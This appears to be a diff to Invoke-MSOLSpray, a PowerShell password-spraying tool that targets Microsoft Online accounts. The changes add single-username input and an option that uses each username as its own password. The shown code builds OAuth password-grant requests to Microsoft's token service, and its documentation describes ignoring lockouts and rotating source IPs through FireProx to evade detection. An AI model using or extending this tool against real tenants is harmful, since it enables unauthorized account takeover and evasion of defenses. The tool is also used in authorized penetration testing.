@@ -1,4 +1,4 @@
-﻿function Invoke-MSOLSpray{
+function Invoke-MSOLSpray{
 
 <#
     .SYNOPSIS
@@ -17,6 +17,10 @@
         
         UserList file filled with usernames one-per-line in the format "user@domain.com"
     
+    .PARAMETER UserName
+        
+        UserName to test against a given password.  Format "user@domain.com"
+
     .PARAMETER Password
         
         A single password that will be used to perform the password spray.
@@ -29,6 +33,10 @@
         
         Forces the spray to continue and not stop when multiple account lockouts are detected.
     
+    .PARAMETER UserAsPass 
+        
+        Sets the Password to be the same as the username.
+        
     .PARAMETER URL
         
         The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
@@ -58,6 +66,10 @@
     [string]
     $UserList = "",
 
+    [Parameter(Position = 1, Mandatory = $False)]
+    [string]
+    $UserName = "",
+
     [Parameter(Position = 2, Mandatory = $False)]
     [string]
     $Password = "",
@@ -69,11 +81,22 @@
 
     [Parameter(Position = 4, Mandatory = $False)]
     [switch]
-    $Force
+    $Force,
+
+    [Parameter(Position = 5, Mandatory = $False)]
+    [switch]
+    $UserAsPass
   )
     
     $ErrorActionPreference= 'silentlycontinue'
-    $Usernames = Get-Content $UserList
+    #$Usernames = Get-Content $UserList
+    $Usernames = @()
+    if ($PSBoundParameters.ContainsKey('userList')) {
+        $Usernames += Get-Content $UserList
+    } else {
+        $Usernames = $UserName
+    }
+
     $count = $Usernames.count
     $curr_user = 0
     $lockout_count = 0
@@ -90,7 +113,12 @@
         # User counter
         $curr_user += 1
         Write-Host -nonewline "$curr_user of $count users tested`r"
-
+        
+        # Set Password to Username if $UserAsPass is set
+        if ($UserAsPass) { 
+            $password = $username.split('@')[0]
+        }
+        
         # Setting up the web request
         $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
         $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
